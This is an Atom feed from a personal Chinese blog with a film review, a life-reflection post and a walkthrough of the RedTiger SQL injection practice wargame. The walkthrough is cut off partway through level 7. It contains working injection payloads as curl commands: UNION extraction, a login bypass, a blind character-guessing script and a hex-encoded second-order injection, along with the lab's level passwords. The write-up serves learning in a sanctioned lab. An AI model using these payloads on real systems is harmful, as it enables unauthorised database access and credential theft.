<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="atom.xsl"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://vienna.bio/blog</id>
    <title>風雪 Blog</title>
    <updated>2024-01-28T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://vienna.bio/blog"/>
    <subtitle>風雪 Blog</subtitle>
    <icon>https://vienna.bio/img/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[Movie "Kill Boksoon"]]></title>
        <id>https://vienna.bio/blog/movie-kill-boksoon</id>
        <link href="https://vienna.bio/blog/movie-kill-boksoon"/>
        <updated>2024-01-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[刚刚在出租屋看了韩国电影杀死福顺，觉得是一部不错的商业片（7.0/10.0），韩国电影还是一如既往地拍的不错。]]></summary>
        <content type="html"><![CDATA[<p>刚刚在出租屋看了韩国电影杀死福顺，觉得是一部不错的商业片（7.0/10.0），韩国电影还是一如既往地拍的不错。</p>
<p>毕竟是一个讲杀手故事的片子，里面的血腥画面很多。我个人觉得虽然实质上里面看似充满血腥画面但其实本质这是一个脑洞片、还略带一点幽默元素。</p>
<p>不过也只限于下饭菜。因为剧情不是很深刻，算是披着看似深刻的剧本实则这部片算是比较轻松，但过程中是确实能勾起紧张并多吃爆米花的。应该这么说：非“只限于”，而是作为下饭菜，它，很不错。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="电影" term="电影"/>
        <category label="韩国" term="韩国"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[最近这些年的碎碎念（一）]]></title>
        <id>https://vienna.bio/blog/最近这些年的碎碎念（一）</id>
        <link href="https://vienna.bio/blog/最近这些年的碎碎念（一）"/>
        <updated>2024-01-18T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[说点什么]]></summary>
        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_K1VF" id="说点什么">说点什么<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#%E8%AF%B4%E7%82%B9%E4%BB%80%E4%B9%88" class="hash-link" aria-label="Direct link to 说点什么" title="Direct link to 说点什么">​</a></h3>
<p>已经有好多年不写博客了，不过没有必要太过表现仪式感，我不准备说什么感性的话。</p>
<p>自从 17 年开始到深圳全职工作后，从某个时间点开始就不写内容了。去年换新电脑，做数据迁移过程中我重新阅读了一些旧文，觉得在不同的人生时刻留下一些记录是一件挺不错的事情。这样的事情可以是拍照、拍视频、发朋友圈，自然也可以是写博客、写日记。我想我不应该在意那些留下来的文字或者内容会不会是幼稚的，毕竟我也一样担心曝光“黑历史”。但是在这些年里面，我又想 其实一个人的“当下”是他在过去所有时间节点的总和。反正无论是幼稚是成熟，这些过往会乱作一团，这些过往合起来就是人的“当下”。像这样的胡思乱想我自打小时候会不停在想，它们绝大多数是幼稚的，不过以后我可以记录一下。</p>
<p>后疫情时代对生活的热情大为下降，直到 2023 年底心情又转变了。因为转变发生在平常普通的一天，所以我觉得这是在浅草寺抽到上上签的效果，因为一些小情况所以当时我挺想将签文转赠朋友，这个事情希望也能新开一篇讲讲（埋坑）。</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="未来">未来<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#%E6%9C%AA%E6%9D%A5" class="hash-link" aria-label="Direct link to 未来" title="Direct link to 未来">​</a></h3>
<p>我和很多很多人一样，并没有很喜欢工作和上班。上班的原因无他，钱和安全感。“钱”最直接的就是当下支出，当下想要用金钱来交换的事物，比如衣食住行、买车买房；另一方面则是从“不上班”引出来的一种感受，它不是这一刻缺钱了，而是“不上班”后我的钱能花多久以及我能不能从其他渠道赚取收入，它们分别是对货币通胀的焦虑和自我能力的怀疑。而安全感相对起来就不是那么 tangible 的东西了，更具体地说这是我的羊群心理效应：因为我的圈子里面大部分人都在上班，所以我不太敢随意地脱离群众，确实是有一点害怕离群后被别人 judge 那些将来未知的境遇。当然啦，我明白走一条自己觉得舒适的路才最重要，希望上天赐我面对未知的勇气。</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="几年">几年<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#%E5%87%A0%E5%B9%B4" class="hash-link" aria-label="Direct link to 几年" title="Direct link to 几年">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="19">19<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#19" class="hash-link" aria-label="Direct link to 19" title="Direct link to 19">​</a></h4>
<p>19 年对我来说发生了很多事情。去了亚洲几个地方也都是第一次去：在台北、吉隆坡和新加坡看到了不一样的华人社会（大概不会开坑展开）；在阿里山日出时看到并认识了 k 小姐，她人很好很出色只是我们没有互相喜欢上对方，想来这是一件拧巴的事情（后来和朋友絮絮叨叨了很多，还是已婚人士懂的多，埋坑一篇）；接着在新加坡、马来某岛和朋友继续度过了那年的生日，岛上慵懒的猫很好地反应了岛上人们的状态；19 年的香港如此动荡，让我对香港人多了一些新认识，我对“香港人”多了敬意、伤感 和 认同（即使我已经好多年不在香港了）；接着到了 19 年底，我和地球上其他人的抽离感一样：疫情开始了。</p>
<p><img decoding="async" loading="lazy" alt="2019 阿里山寄出的明信片" src="https://vienna.bio/assets/images/alishan_post_card-05996df85f453db6a5c507fd25e9917e.png" width="756" height="1008" class="img_GQDY">
图：2019 阿里山寄出的明信片</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="20">20<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#20" class="hash-link" aria-label="Direct link to 20" title="Direct link to 20">​</a></h4>
<p>20 年公司变更和办公 base 地搬迁，我随着团队来到了杭州，至今还会因为时不时路过刚来时住下的酒店而想起那种出远门的感觉。也算应了我当时想到大公司体验一下的想法。现在我看过创业小而美也经历过大架构，职场路算得上“心满意足”了。</p>
<p>值得一提在搬到新的出租屋后我真正开始煮食，自觉这几年不断的重复算是给我加了一项可以享受且实用的技能（似乎值得开一个系列来记录）。</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="未完待续">未完待续<a href="https://vienna.bio/blog/%E6%9C%80%E8%BF%91%E8%BF%99%E4%BA%9B%E5%B9%B4%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD" class="hash-link" aria-label="Direct link to 未完待续" title="Direct link to 未完待续">​</a></h3>
<p>写着写着大脑疲劳了，不讨厌写作的感觉但开始越写越简略了，不如下次再写。</p>
<p>在最近三、四年还有其他一些体验如 跑山、锻炼、见老网友之金华、上海、南京、团建之泸沽湖、千岛湖和长沙、认识一些朋友、看了下雪天、逛女仆咖啡厅（遇到奇妙的世界线重叠）、还有最近的等等等等。现在庆幸在一些时刻拍了一些照片，让我重新记起好多，也许会有下一篇，也许没有，哈哈谢谢阅读。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="日常" term="日常"/>
        <category label="daily" term="daily"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[玩 redtiger SQL 注入 10 关]]></title>
        <id>https://vienna.bio/blog/玩-redtiger-SQL-注入-10-关</id>
        <link href="https://vienna.bio/blog/玩-redtiger-SQL-注入-10-关"/>
        <updated>2018-04-10T22:31:42.000Z</updated>
        <summary type="html"><![CDATA[以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈]]></summary>
        <content type="html"><![CDATA[<p>以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈</p>
<p>传送门：<a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="noopener noreferrer">https://redtiger.labs.overthewire.org/</a></p>
<p>下面是流水账，想自己先玩的就随意罗</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-1">level 1<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-1" class="hash-link" aria-label="Direct link to level 1" title="Direct link to level 1">​</a></h3>
<p>cat 参数是注入点，没有明显回显，使用 1=1 ， 1=2 等可以确认，
使用 union 捞出数据</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl "https://redtiger.labs.overthewire.org/level1.php?cat=2/**/union/**/select/**/99,100,username,password/**/from/**/level1_users;--“;</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-2">level 2<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-2" class="hash-link" aria-label="Direct link to level 2" title="Direct link to level 2">​</a></h3>
<p>简单条件，单引号拼接</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">--data "username=a&amp;password=a'+or+'1'='1&amp;login=Login"</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-3">level 3<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-3" class="hash-link" aria-label="Direct link to level 3" title="Direct link to level 3">​</a></h3>
<p>提示说需要 trigger error，完了一顿时间没有头绪，看了答案，学会了触发类型错误，</p>
<p>需要在 usr 参数用 usr[0]=xxxx 来触发类型错误，再从出错提示中拿到 inc 文件，直接访问 inc 文件可以拿到源码，
之后就是把 sql 语句经过源码加解密来触发了</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-4">level 4<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-4" class="hash-link" aria-label="Direct link to level 4" title="Direct link to level 4">​</a></h3>
<p>使用substring 数值猜解 cell 值</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl "https://redtiger.labs.overthewire.org/level4.php?id=1/**/union/**/select/**/keyword,2/**/from/**/level4_secret/**/where/**/ascii(substring(keyword,1,1))=107;--"; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug' -H 'Connection: keep-alive' --compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>下面是简单枚举，可以改用二分查找减少请求，又使用并发缩短时间</p>
<div class="language-py codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-py codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">check</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ascii_val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Popen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"bash"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"-c"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> command </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">ascii_val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> stdout</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">subprocess</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PIPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    out</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _ </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">communicate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Query returned 2 rows"</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hits </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> c </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> check</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            hits</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-5">level 5<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-5" class="hash-link" aria-label="Direct link to level 5" title="Direct link to level 5">​</a></h3>
<p>从hints 理解，就算拿到 password，也不能登入，限制了函数其实也是缩窄了范围，
解法就是自己提供一组可登入的数据</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl 'https://redtiger.labs.overthewire.org/level5.php?mode=login'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level5.php?mode=login'; -H 'Connection: keep-alive' --data "username=a' union all select '1','534b44a19bf18d20b71ecc4eb77c572f&amp;password=alex&amp;login=Login" --compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-6">level 6<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-6" class="hash-link" aria-label="Direct link to level 6" title="Direct link to level 6">​</a></h3>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl "https://redtiger.labs.overthewire.org/level6.php?user=-1/**/or/**/status=11/**/union/**/select/**/username,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20/**/as/**/username,username,2,username/**/from/**/level6_users"; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level6.php?user=1'; -H 'Connection: keep-alive' --data 'user=admin&amp;password=admin&amp;login=Login' —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithStickyNavbar_K1VF" id="发现">发现<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#%E5%8F%91%E7%8E%B0" class="hash-link" aria-label="Direct link to 发现" title="Direct link to 发现">​</a></h5>
<p>从 user 里直接注入 union 并不影响输出，但会有 user not found 的错误提示，说明会根据 user 的 id 先拿到一个 username，再从 username 拿一次 user 数据，</p>
<h5 class="anchor anchorWithStickyNavbar_K1VF" id="结果">结果<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#%E7%BB%93%E6%9E%9C" class="hash-link" aria-label="Direct link to 结果" title="Direct link to 结果">​</a></h5>
<p>不会做，翻了答案才知道可以间接注入，把用户名注入成另外一句 payload，当进行第二次 query 时触发数据替换，把邮件换成密码来显示
看了答案除了学会这招迂回注入，还发现可以用十六进制绕开 mysql_real_escape_string 的单引号过滤，hmmm</p>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="level-7">level 7<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-7" class="hash-link" aria-label="Direct link to level 7" title="Direct link to level 7">​</a></h3>
<h5 class="anchor anchorWithStickyNavbar_K1VF" id="发现-1">发现<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#%E5%8F%91%E7%8E%B0-1" class="hash-link" aria-label="Direct link to 发现" title="Direct link to 发现">​</a></h5>
<p>sql 语法错误后会打印错误信息，发现整条 query</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%xxx%' OR text.title LIKE '%xxx%')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%' union select 1,2,3,4,5,6 from  level7_texts text where text.title ='%' OR text.title LIKE '%xxx%')</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>先拼接一条合法的注入，再想办法拿到 google 相关文章的作者</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain"> curl 'https://redtiger.labs.overthewire.org/level7.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) 